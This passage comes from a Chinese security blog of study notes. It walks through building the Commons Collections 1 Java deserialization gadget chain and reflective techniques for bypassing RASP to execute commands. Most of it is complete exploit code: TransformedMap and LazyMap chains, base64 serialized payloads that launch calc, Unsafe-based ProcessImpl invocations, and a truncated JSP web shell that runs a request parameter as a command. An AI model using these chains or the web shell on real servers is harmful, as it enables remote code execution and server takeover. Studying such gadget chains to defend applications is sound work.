        Object o = constructor.newInstance(Setter.class, decoratedMap);

        byte[] bytes = serialize(o);
        unSerialize(bytes);

    &#125;


    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;

&#125;
</code></pre>
<p>这里的注解随便给了一个 有问题再慢慢改</p>
<p>执行发现并没有弹计算器 </p>
<p>在反序列化的时候报错了</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939727.png" alt="image-20240201202216370"></p>
<p>原因在</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939274.png" alt="image-20240201202321164"></p>
<p>这里getKey之后要传给name 所以key必须为字符串</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939655.png" alt="image-20240201202356327"></p>
<p>不在报错 但是也没有弹计算机 </p>
<p>调试发现 </p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939397.png" alt="image-20240201202440491"></p>
<p>注解必须要有属性 然后map的key得是属性名</p>
<p>我们去找一个有属性的注解</p>
<p>比如Action的falut属性<img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939384.png" alt="image-20240201203706688"></p>
<p>修改后代码如下</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939356.png" alt="image-20240201203733301"></p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.ws.Action;
import java.io.*;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class TransformerTest &#123;
    public static void main(String[] args) throws Exception &#123;
        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, new ConstantTransformer(1), chainedTransformer);

        Class&lt;?&gt; AIHClazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; constructor = AIHClazz.getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Action.class, decoratedMap);

//        byte[] bytes = serialize(o);
//        System.out.println(Base64.getEncoder().encodeToString(bytes));
        byte[] bytes = Base64.getDecoder().decode(&quot;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnR0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNxAH4AB3ZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWVwdAARZ2V0RGVjbGFyZWRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABV1cQB+ABoAAAACcHB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAac3EAfgAVdXEAfgAaAAAAAXQABGNhbGN0AARleGVjdXEAfgAeAAAAAXEAfgAhc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAVmYXVsdHEAfgAxeHh2cgATamF2YXgueG1sLndzLkFjdGlvbgAAAAAAAAAAAAAAeHA=&quot;);
        unSerialize(bytes);

    &#125;

    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;

&#125;
</code></pre>
<p>成功弹了计算器</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939961.png" alt="image-20240201204127216"></p>
<p>这里把序列化和反序列化的点打断了没有一起做</p>
<p>原因是部分链子在序列化时就会弹计算机 而当序列化弹了反序列化没弹就会影响我们的判断 从而链子不可用</p>
<p>所以要么序列化反序列化分步去走 要么打断点跟</p>
<p>这里去看ysoserial的CC1 发现和我们的不太一样</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939255.png" alt="image-20240201204519416"></p>
<p>yso 用的是LazyMap</p>
<p>所以这里我们再来跟一下LazyMap</p>
<h2 id="CommonsCollections1-LazyMap"><a href="#CommonsCollections1-LazyMap" class="headerlink" title="CommonsCollections1  (LazyMap)"></a>CommonsCollections1  (LazyMap)</h2><pre><code class="ini">Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
</code></pre>
<p>重复的地方就不细说了</p>
<p>写到这里才发现上面的类名一直是TransformerTest</p>
<p>大体框架是一样的 所以先全部抄过来</p>
<p>然后从LazyMap开始分析</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939863.png" alt="image-20240201205941012"></p>
<p>去找谁调了set 这个应该相当多</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939349.png" alt="image-20240201211745664"></p>
<p>yso的是AnnotationInvocationHandler#invoke</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939980.png" alt="image-20240201211843471"></p>
<p>被代理的类调用了任意方法都会调用其invocationHandler的invoke方法</p>
<p>在这里我们传入AnnotationInvocationHandler的实例 去代理chainedTransformer</p>
<p>最后再从AnnotationInvocationHandler#readObject回来就行</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.ws.Action;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class CC1LazyVersion &#123;
    public static void main(String[] args) throws Exception &#123;
        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, new ConstantTransformer(1), chainedTransformer);

        Class&lt;?&gt; AIHClazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; constructor = AIHClazz.getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Action.class, decoratedMap);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);

        Map finalMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), invocationHandler);

        Object object =  constructor.newInstance(Action.class, finalMap);

        byte[] bytes = serialize(object);
//        System.out.println(Base64.getEncoder().encodeToString(bytes));
        unSerialize(bytes);

    &#125;

    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;

&#125;
</code></pre>
<p>现在就是跟进去 把判断啥的都过了</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939185.png" alt="image-20240201220549755"></p>
<p>然而并没有什么判断没过的 一运行就出计算器了</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.ws.Action;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class CC1LazyVersion &#123;
    public static void main(String[] args) throws Exception &#123;
        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, new ConstantTransformer(1), chainedTransformer);

        Class&lt;?&gt; AIHClazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; constructor = AIHClazz.getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Action.class, decoratedMap);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);

        Map finalMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), invocationHandler);

        Object object =  constructor.newInstance(Action.class, finalMap);

//        byte[] bytes = serialize(object);
//        System.out.println(Base64.getEncoder().encodeToString(bytes));
        byte[] bytes = Base64.getDecoder().decode(
            &quot;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAIADWphdmEudXRpbC5NYXAAFGphdmEuaW8uU2VyaWFsaXphYmxleHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3EAfgAAc3IAMW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuVHJhbnNmb3JtZWRNYXBhdz/gXfFacAMAAkwADmtleVRyYW5zZm9ybWVydAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjtMABB2YWx1ZVRyYW5zZm9ybWVycQB+AAp4cHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50dAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcQB+AAx2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1lcHQAEWdldERlY2xhcmVkTWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAjc3EAfgAadXEAfgAfAAAAAnBwdAAGaW52b2tldXEAfgAjAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AH3NxAH4AGnVxAH4AHwAAAAF0AARjYWxjdAAEZXhlY3VxAH4AIwAAAAFxAH4AJnNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAFZmF1bHRxAH4ANnh4dnIAE2phdmF4LnhtbC53cy5BY3Rpb24AAAAAAAAAAAAAAHhwcQB+ADg=&quot;
        );
        unSerialize(bytes);

    &#125;

    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;

&#125;
</code></pre>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/java/" style="color: #03a9f4">java</a>
        </span>
        
    </div>
    <a href="/2024/02/24/CommonCollections1/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/02/24/test/">
        <h2 class="post-title">test</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/2/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            
            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/02/24/test/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/01/27/JavaSec%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
        <h2 class="post-title">JavaSec基础命令执行</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/1/27
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>记录<a target="_blank" rel="noopener" href="https://github.com/javaweb-sec/javaweb-sec%E7%9A%84%E5%AD%A6%E4%B9%A0">https://github.com/javaweb-sec/javaweb-sec的学习</a></p>
<h1 id="CommandExecute"><a href="#CommandExecute" class="headerlink" title="CommandExecute"></a>CommandExecute</h1><p>Runtime#exec</p>
<p>ProcessBuilder#start</p>
<p>以上两个最终都要调到ProcessImpl</p>
<p>而ProcessImpl会调用native的forkAndExec</p>
<p>实际最终都是调到Java_java_lang_ProcessImpl_forkAndExec</p>
<p>而我们只需要直接调用最终执行的<code>UNIXProcess/ProcessImpl</code>实现命令执行或者直接反射<code>UNIXProcess/ProcessImpl</code>的<code>forkAndExec</code>方法就可以绕过RASP实现命令执行了。</p>
<p>但是我本地跟了一下 最终调的是Java_java_lang_ProcessImpl_create  并没有找到 Java_java_lang_ProcessImpl_forkAndExec</p>
<p>在linux下有forkAndExec</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/80348e9d2a819916527fcb258707602d.png" alt="image-20240127135535440"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/595ea11cea97f3b0f654478d5b51d189.png" alt="image-20240127135551312"></p>
<pre><code class="cpp">Java_java_lang_ProcessImpl_create(JNIEnv *env, jclass ignored,
                                  jstring cmd,
                                  jstring envBlock,
                                  jstring dir,
                                  jlongArray stdHandles,
                                  jboolean redirectErrorStream)
&#123;
    jlong ret = 0;
    if (cmd != NULL &amp;&amp; stdHandles != NULL) &#123;
        const jchar *pcmd = (*env)-&gt;GetStringChars(env, cmd, NULL);
        if (pcmd != NULL) &#123;
            const jchar *penvBlock = (envBlock != NULL)
                ? (*env)-&gt;GetStringChars(env, envBlock, NULL)
                : NULL;
            const jchar *pdir = (dir != NULL)
                ? (*env)-&gt;GetStringChars(env, dir, NULL)
                : NULL;
            jlong *handles = (*env)-&gt;GetLongArrayElements(env, stdHandles, NULL);
            if (handles != NULL) &#123;
                ret = processCreate(
                    env,
                    pcmd,
                    penvBlock,
                    pdir,
                    handles,
                    redirectErrorStream);
                (*env)-&gt;ReleaseLongArrayElements(env, stdHandles, handles, 0);
            &#125;
            if (pdir != NULL)
                (*env)-&gt;ReleaseStringChars(env, dir, pdir);
            if (penvBlock != NULL)
                (*env)-&gt;ReleaseStringChars(env, envBlock, penvBlock);
            (*env)-&gt;ReleaseStringChars(env, cmd, pcmd);
        &#125;
    &#125;
    return ret;
&#125;
</code></pre>
<p>这里就不写Runtime和ProcessBuilder的了</p>
<h2 id="反射ProcessImpl命令执行"><a href="#反射ProcessImpl命令执行" class="headerlink" title="反射ProcessImpl命令执行"></a>反射ProcessImpl命令执行</h2><pre><code class="java">package tem;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

public class Exec &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;
        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        startMethod.setAccessible(true);
        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
    &#125;
&#125;
</code></pre>
<p>高版本则需要用Unsafe绕过</p>
<pre><code class="java">package tem;

import sun.misc.Unsafe;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

public class Exec &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException &#123;
        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);

        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);
        Class cureentClass = Exec.class;

        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());


        startMethod.setAccessible(true);
        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
    &#125;
&#125;
</code></pre>
<h2 id="反射Java-java-lang-ProcessImpl-create命令执行"><a href="#反射Java-java-lang-ProcessImpl-create命令执行" class="headerlink" title="反射Java_java_lang_ProcessImpl_create命令执行"></a>反射Java_java_lang_ProcessImpl_create命令执行</h2><p>当ProcessImpl也不能用的时候可以考虑</p>
<p>过程如下</p>
<ol>
<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>ProcessImpl</code>类对象。</li>
<li>反射<code>ProcessImpl</code>类的<code>create</code>方法。</li>
<li>构造<code>create</code>需要的参数并调用。</li>
</ol>
<pre><code class="java">package tem;

import sun.misc.Unsafe;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class NativeExec &#123;
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;
        // 获取ProcessImpl的实例
        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);
        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        Object o = unsafe.allocateInstance(clazz);

        Method createMethod = clazz.getDeclaredMethod(&quot;create&quot;, String.class, String.class, String.class, long[].class, boolean.class);

        Class cureentClass = NativeExec.class;
        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());

        createMethod.setAccessible(true);
//        Constructor&lt;?&gt; declaredConstructor = clazz.getDeclaredConstructor(String[].class,String.class,String.class,long[].class,boolean.class,boolean.class);
//        declaredConstructor.setAccessible(true);
//        System.out.println(declaredConstructor);
//        Object p = declaredConstructor.newInstance(new String[]&#123;&quot;calc&quot;&#125;, null, null, new long[]&#123;-1L,-1L,-1L&#125;, false, false);
//        System.out.println(p);
        createMethod.invoke(null,
                &quot;calc&quot;,
                null,
                null,
                new long[]&#123;-1L,-1L,-1L&#125;,
                false);



    &#125;
&#125;
</code></pre>
<p>在linux下则是<code>forkAndExec</code> 这个直接抄了</p>
<p>过程如下</p>
<ol>
<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li>
<li>构造<code>forkAndExec</code>需要的参数并调用。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li>
</ol>
<pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%@ page import=&quot;sun.misc.Unsafe&quot; %&gt;
&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
&lt;%!
    byte[] toCString(String s) &#123;
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    &#125;


%&gt;
&lt;%
    String[] strs = request.getParameterValues(&quot;cmd&quot;);

    if (strs != null) &#123;
        Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class processClass = null;

        try &#123;
            processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);
        &#125; catch (ClassNotFoundException e) &#123;
            processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        &#125;

        Object processObject = unsafe.allocateInstance(processClass);

        // Convert arguments to a contiguous block; it&#39;s easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i &lt; args.length; i++) &#123;
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        &#125;

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) &#123;
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        &#125;

        int[] envc                 = new int[1];
        int[] std_fds              = new int[]&#123;-1, -1, -1&#125;;
        Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);
